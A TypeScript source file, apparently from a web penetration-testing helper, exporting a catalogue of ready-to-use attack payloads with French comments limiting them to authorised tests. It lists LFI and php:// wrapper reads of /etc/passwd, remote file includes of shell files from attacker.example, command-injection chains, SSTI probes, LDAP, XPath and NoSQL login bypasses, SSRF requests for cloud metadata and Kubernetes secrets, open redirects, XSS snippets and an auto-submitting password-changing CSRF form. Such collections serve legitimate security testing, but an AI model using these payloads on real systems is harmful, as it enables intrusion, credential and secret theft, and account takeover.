/** Payloads statiques (tests autorisés uniquement). Références : OWASP, HackBar, PayloadsAllTheThings, HackTricks, SecLists (fuzzing). */

export type PayloadSample = { label: string; value: string };

export const lfiSamples: PayloadSample[] = [
  { label: "Basic LF", value: "?page=../../../etc/passwd" },
  { label: "Null byte", value: "?page=../../../etc/passwd%00" },
  {
    label: "Double encoding",
    value: "?page=%252e%252e%252fetc%252fpasswd",
  },
  {
    label: "Path truncation",
    value: "?page=../../../etc/passwd............[ADD MORE]",
  },
  {
    label: "Filter bypass",
    value: "?page=....//....//etc/passwd",
  },
  {
    label: "php://filter (read)",
    value: "?page=php://filter/read=string.rot13/resource=index.php",
  },
  {
    label: "php://filter (base64)",
    value:
      "?page=php://filter/convert.base64-encode/resource=/etc/passwd",
  },
  { label: "zip://", value: "?page=zip://shell.jpg%23payload.php" },
  {
    label: "data://",
    value: "?page=data://text/plain;base64,[base64_encode_shell]",
  },
  { label: "expect://", value: "?page=expect://id" },
  {
    label: "phar://",
    value: "?page=phar://uploaded.zip/shell.php",
  },
  {
    label: "compress.zlib://",
    value: "?page=compress.zlib://file.gz",
  },
  {
    label: "php://input",
    value: "POST body → ?file=php://input (code dans le corps)",
  },
  {
    label: "file://",
    value: "?page=file:///etc/passwd",
  },
  {
    label: "glob://",
    value: "?page=glob:///etc/pa?swd",
  },
];

export const rfiSamples: PayloadSample[] = [
  {
    label: "HTTP remote include",
    value: "?page=http://attacker.example/shell.txt",
  },
  {
    label: "HTTPS remote include",
    value: "?include=https://attacker.example/payload.php",
  },
  {
    label: "Null byte (PHP < 5.3)",
    value: "?page=http://attacker.example/evil.txt%00",
  },
  {
    label: "Double URL-encoded",
    value: "?page=%68%74%74%70%3a%2f%2fattacker.example%2fshell.txt",
  },
  {
    label: "FTP wrapper",
    value: "?page=ftp://user:pass@attacker.example/file.txt",
  },
  {
    label: "Query param variants",
    value: "?file=http://attacker.example/x&path=http://attacker.example/y",
  },
  {
    label: "Path + remote",
    value: "?page=/var/www/../../../http://attacker.example/shell.txt",
  },
  {
    label: "dict:// (SSRF-style)",
    value: "?url=dict://127.0.0.1:6379/info",
  },
  {
    label: "gopher:// stub",
    value: "?url=gopher://127.0.0.1:70/_",
  },
];

export const csrfMenu: { label: string; id: string }[] = [
  { label: "HTML form POST (auto-submit)", id: "csrf_form_post" },
  { label: "GET link (state-changing)", id: "csrf_get_link" },
  { label: "Note Referer / SameSite", id: "csrf_referer_samesite_note" },
  { label: "JSON POST (fetch)", id: "csrf_json_fetch" },
];

export const cmdMenu: { label: string; id: string }[] = [
  { label: "Separators: ; | && ||", id: "cmd_separators" },
  { label: "Subshell $(cmd)", id: "cmd_subshell_dollar" },
  { label: "Backticks", id: "cmd_backticks" },
  { label: "Newline (HTTP smuggling / raw)", id: "cmd_newline" },
  { label: "Unix chain (id)", id: "cmd_unix_id" },
  { label: "Windows chain (whoami)", id: "cmd_windows_whoami" },
  { label: "PowerShell one-liner", id: "cmd_powershell" },
  { label: "cmd.exe /c", id: "cmd_exe_c" },
  { label: "Windows var expansion", id: "cmd_win_var" },
];

export const sstiMenu: { label: string; id: string }[] = [
  { label: "Jinja2 probe", id: "ssti_jinja" },
  { label: "Twig probe", id: "ssti_twig" },
  { label: "Smarty probe", id: "ssti_smarty" },
  { label: "Freemarker probe", id: "ssti_freemarker" },
  { label: "Pebble probe", id: "ssti_pebble" },
  { label: "Velocity probe", id: "ssti_velocity" },
  { label: "ERB (Ruby) probe", id: "ssti_erb" },
  { label: "Liquid probe", id: "ssti_liquid" },
  { label: "Thymeleaf probe", id: "ssti_thymeleaf" },
  { label: "Mako (Python) probe", id: "ssti_mako" },
];

/** LDAP — filtres souvent utilisés pour tests d’injection (RFC 4515). */
export const ldapMenu: { label: string; id: string }[] = [
  { label: "Tautology (*)", id: "ldap_star" },
  { label: "OR bypass", id: "ldap_or" },
  { label: "Closing + comment", id: "ldap_close_comment" },
  { label: "Wildcard user", id: "ldap_wildcard" },
  { label: "Null / metachar note", id: "ldap_note" },
];

/** XPath — échappement de chaîne classique. */
export const xpathMenu: { label: string; id: string }[] = [
  { label: "' or '1'='1", id: "xpath_tautology" },
  { label: "' or 1=1 or ''='", id: "xpath_or_chain" },
  { label: "count(/) probe", id: "xpath_count" },
  { label: "position() probe", id: "xpath_position" },
  { label: "Union-style text()", id: "xpath_text_nodes" },
];

/** NoSQL (MongoDB & JS $where). */
export const nosqlMenu: { label: string; id: string }[] = [
  { label: "Mongo $ne null", id: "nosql_ne_null" },
  { label: "Mongo $gt empty", id: "nosql_gt_empty" },
  { label: "Mongo $regex", id: "nosql_regex" },
  { label: "Mongo $exists true", id: "nosql_exists_true" },
  { label: "Mongo $nin []", id: "nosql_nin_empty" },
  { label: "JSON body (login bypass)", id: "nosql_json_login" },
  { label: "URL-encoded operators (GET)", id: "nosql_url_operators" },
  { label: "$where (legacy)", id: "nosql_where_js" },
];

/** SSRF — schémas et cibles internes courantes (cloud metadata). */
export const ssrfMenu: { label: string; id: string }[] = [
  { label: "Loopback :80", id: "ssrf_localhost_80" },
  { label: "Loopback :443", id: "ssrf_localhost_443" },
  { label: "IPv6 mapped IPv4", id: "ssrf_ipv6_mapped" },
  { label: "IP décimal (127.0.0.1)", id: "ssrf_decimal_ip" },
  { label: "AWS metadata", id: "ssrf_aws_metadata" },
  { label: "GCP metadata (header)", id: "ssrf_gcp_metadata" },
  { label: "Azure metadata", id: "ssrf_azure_metadata" },
  { label: "DigitalOcean metadata", id: "ssrf_do_metadata" },
  { label: "Kubernetes API (in-cluster)", id: "ssrf_k8s_api" },
  { label: "file:///etc/passwd", id: "ssrf_file_unix" },
  { label: "file:///c:/windows/win.ini", id: "ssrf_file_win" },
  { label: "dict:// stub", id: "ssrf_dict_stub" },
];

/** Open redirect / bypass de validation d’URL. */
export const redirectMenu: { label: string; id: string }[] = [
  { label: "Protocol-relative //", id: "redir_protocol_relative" },
  { label: "Backslash \\", id: "redir_backslash" },
  { label: "Double slash ///", id: "redir_triple_slash" },
  { label: "@ credentialed host", id: "redir_at_host" },
  { label: "Query param next=", id: "redir_query_next" },
  { label: "Unicode homoglyph note", id: "redir_unicode_note" },
];

/** XSS — snippets statiques (en plus des transformations dans xss.ts). */
export const xssStaticMenu: { label: string; id: string }[] = [
  { label: "<img onerror>", id: "xss_img_onerror" },
  { label: "<svg onload>", id: "xss_svg_onload" },
  { label: "<script>alert", id: "xss_script_basic" },
  { label: "javascript: URL", id: "xss_javascript_url" },
  { label: "<body onload>", id: "xss_body_onload" },
  { label: "<details ontoggle>", id: "xss_details_ontoggle" },
  { label: "<select autofocus onfocus>", id: "xss_select_autofocus" },
  { label: "<iframe srcdoc>", id: "xss_iframe_srcdoc" },
];

const CSRF_FORM_POST = `<form id="csrf" method="POST" action="https://TARGET/CHANGE_PASSWORD">
  <input type="hidden" name="new_password" value="hacked" />
</form>
<script>document.getElementById("csrf").submit();</script>`;

const CSRF_GET_LINK =
  "https://TARGET/delete?id=1&confirm=yes  (GET non-idempotent — vérifier protections CSRF)";

const CSRF_REFERER_NOTE =
  "CSRF: vérifier token synchronizer, SameSite cookies (Lax/Strict), header Referer/Origin, CORS.";

const CSRF_JSON_FETCH = `fetch("https://TARGET/api/action", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ action: "danger" })
});`;

const CMD_SEPARATORS = "; | || && & \\n ` $() ";

const CMD_SUBSHELL = "$(id)";

const CMD_BACKTICKS = "`id`";

const CMD_NEWLINE = "cmd%0aid";

const CMD_UNIX = ";id;whoami;uname -a";

const CMD_WINDOWS = "&whoami&dir&";

const CMD_POWERSHELL = "; powershell -NoP -c \"whoami\"";

const CMD_EXE_C = "& cmd.exe /c whoami &";

const CMD_WIN_VAR = "%SYSTEMROOT%\\system32\\cmd.exe /c whoami";

const SSTI_JINJA = "{{7*7}}";

const SSTI_TWIG = "{{7*7}}";

const SSTI_SMARTY = "{7*7}";

const SSTI_FREEMARKER = "${7*7}";

const SSTI_PEBBLE = "{{ 7*7 }}";

const SSTI_VELOCITY = "#set($x=7*7)$x";

const SSTI_ERB = "<%= 7*7 %>";

const SSTI_LIQUID = "{{7 | times: 7}}";

const SSTI_THYMELEAF = "[[${7*7}]]";

const SSTI_MAKO = "${7*7}";

const LDAP_STAR = "*)(uid=*))(|(uid=*";

const LDAP_OR = "admin)(|(password=*))";

const LDAP_CLOSE_COMMENT = "*)(&";

const LDAP_WILDCARD = "*)(objectClass=*";

const LDAP_NOTE =
  "LDAP: échapper ), (, *, \\, NUL ; tester encodage UTF-8 / double encodage selon le parseur.";

const XPATH_TAUT = "' or '1'='1";

const XPATH_OR = "' or 1=1 or ''='";

const XPATH_COUNT = "' or count(/)=1 or 'a'='a";

const XPATH_POS = "' or position()=1 or 'a'='a";

const XPATH_TEXT = "' or string-length(name())>0 or 'a'='a";

const NOSQL_NE = '{"username": {"$ne": null}, "password": {"$ne": null}}';

const NOSQL_GT = '{"username": {"$gt": ""}, "password": {"$gt": ""}}';

const NOSQL_REGEX = '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}';

const NOSQL_JSON_LOGIN =
  '{"login":"admin","password":{"$ne":""}}  // adapter clés au schéma';

const NOSQL_EXISTS =
  '{"username": {"$exists": true}, "password": {"$exists": true}}';

const NOSQL_NIN =
  '{"username": {"$nin": []}, "password": {"$nin": []}}';

const NOSQL_URL_OPS =
  "username[$ne]=&password[$ne]=  // ou username[$gt]=&password[$gt]= (GET / querystring)";

const NOSQL_WHERE =
  "'; return true; var x='  // $where JS (MongoDB legacy, souvent désactivé)";

const SSRF_LOCAL_80 = "http://127.0.0.1/";

const SSRF_LOCAL_443 = "https://127.0.0.1/";

const SSRF_IPV6_MAPPED = "http://[::ffff:127.0.0.1]/";

const SSRF_DECIMAL = "http://2130706433/";

const SSRF_AWS = "http://169.254.169.254/latest/meta-data/";

const SSRF_GCP =
  "http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)";

const SSRF_AZURE = "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (header: Metadata: true)";

const SSRF_DO = "http://169.254.169.254/metadata/v1.json";

const SSRF_K8S =
  "https://kubernetes.default.svc/api/v1/namespaces/default/secrets (header: Authorization: Bearer …)";

const SSRF_FILE_UNIX = "file:///etc/passwd";

const SSRF_FILE_WIN = "file:///c:/windows/win.ini";

const SSRF_DICT = "dict://127.0.0.1:6379/info";

const REDIR_PROTO = "//attacker.example/";

const REDIR_BACKSLASH = "/\\attacker.example/";

const REDIR_TRIPLE = "///attacker.example/";

const REDIR_AT = "https://trusted.example@attacker.example/";

const REDIR_QUERY = "?next=https://attacker.example&return=//attacker.example";

const REDIR_UNICODE =
  "Open redirect: homoglyphes IDN, encodage Unicode, //, backslash, encodage URL";

const XSS_IMG = '<img src=x onerror=alert(1)>';

const XSS_SVG = '<svg onload=alert(1)>';

const XSS_SCRIPT = "<script>alert(1)</script>";

const XSS_JS_URL = "javascript:alert(1)";

const XSS_BODY = "<body onload=alert(1)>";

const XSS_DETAILS = "<details open ontoggle=alert(1)><summary>x</summary></details>";

const XSS_SELECT = "<select onfocus=alert(1) autofocus></select>";

const XSS_IFRAME_SRCDOC = '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>';

export const staticPayloadById: Record<string, string> = {
  csrf_form_post: CSRF_FORM_POST,
  csrf_get_link: CSRF_GET_LINK,
  csrf_referer_samesite_note: CSRF_REFERER_NOTE,
  csrf_json_fetch: CSRF_JSON_FETCH,
  cmd_separators: CMD_SEPARATORS,
  cmd_subshell_dollar: CMD_SUBSHELL,
  cmd_backticks: CMD_BACKTICKS,
  cmd_newline: CMD_NEWLINE,
  cmd_unix_id: CMD_UNIX,
  cmd_windows_whoami: CMD_WINDOWS,
  cmd_powershell: CMD_POWERSHELL,
  cmd_exe_c: CMD_EXE_C,
  cmd_win_var: CMD_WIN_VAR,
  ssti_jinja: SSTI_JINJA,
  ssti_twig: SSTI_TWIG,
  ssti_smarty: SSTI_SMARTY,
  ssti_freemarker: SSTI_FREEMARKER,
  ssti_pebble: SSTI_PEBBLE,
  ssti_velocity: SSTI_VELOCITY,
  ssti_erb: SSTI_ERB,
  ssti_liquid: SSTI_LIQUID,
  ssti_thymeleaf: SSTI_THYMELEAF,
  ssti_mako: SSTI_MAKO,
  ldap_star: LDAP_STAR,
  ldap_or: LDAP_OR,
  ldap_close_comment: LDAP_CLOSE_COMMENT,
  ldap_wildcard: LDAP_WILDCARD,
  ldap_note: LDAP_NOTE,
  xpath_tautology: XPATH_TAUT,
  xpath_or_chain: XPATH_OR,
  xpath_count: XPATH_COUNT,
  xpath_position: XPATH_POS,
  xpath_text_nodes: XPATH_TEXT,
  nosql_ne_null: NOSQL_NE,
  nosql_gt_empty: NOSQL_GT,
  nosql_regex: NOSQL_REGEX,
  nosql_exists_true: NOSQL_EXISTS,
  nosql_nin_empty: NOSQL_NIN,
  nosql_json_login: NOSQL_JSON_LOGIN,
  nosql_url_operators: NOSQL_URL_OPS,
  nosql_where_js: NOSQL_WHERE,
  ssrf_localhost_80: SSRF_LOCAL_80,
  ssrf_localhost_443: SSRF_LOCAL_443,
  ssrf_ipv6_mapped: SSRF_IPV6_MAPPED,
  ssrf_decimal_ip: SSRF_DECIMAL,
  ssrf_aws_metadata: SSRF_AWS,
  ssrf_gcp_metadata: SSRF_GCP,
  ssrf_azure_metadata: SSRF_AZURE,
  ssrf_do_metadata: SSRF_DO,
  ssrf_k8s_api: SSRF_K8S,
  ssrf_file_unix: SSRF_FILE_UNIX,
  ssrf_file_win: SSRF_FILE_WIN,
  ssrf_dict_stub: SSRF_DICT,
  redir_protocol_relative: REDIR_PROTO,
  redir_backslash: REDIR_BACKSLASH,
  redir_triple_slash: REDIR_TRIPLE,
  redir_at_host: REDIR_AT,
  redir_query_next: REDIR_QUERY,
  redir_unicode_note: REDIR_UNICODE,
  xss_img_onerror: XSS_IMG,
  xss_svg_onload: XSS_SVG,
  xss_script_basic: XSS_SCRIPT,
  xss_javascript_url: XSS_JS_URL,
  xss_body_onload: XSS_BODY,
  xss_details_ontoggle: XSS_DETAILS,
  xss_select_autofocus: XSS_SELECT,
  xss_iframe_srcdoc: XSS_IFRAME_SRCDOC,
};
